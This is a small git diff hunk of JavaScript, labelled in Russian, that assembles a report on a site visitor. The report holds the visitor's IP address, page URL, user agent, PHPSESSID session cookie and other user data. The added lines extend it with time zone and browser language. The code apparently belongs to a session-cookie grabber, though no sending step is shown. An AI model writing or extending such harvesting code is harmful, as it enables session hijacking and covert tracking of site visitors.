@@ -170,6 +170,8 @@
             fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
             fileContent += `IP-адрес: ${userIP}\n`;
             fileContent += `URL страницы: ${window.location.href}\n`;
+			fileContent += `Time Zone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+			fileContent += `Laungage: ${navigator.language}\n\n`;
             fileContent += `User-Agent: ${navigator.userAgent}\n\n`;
             fileContent += `--- PHPSESSID ---\n${phpsessid || "PHPSESSID: не найдена"}\n\n`;
 			fileContent += `--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ userDataResult ---\n${userDataResultStr}\n\n`;
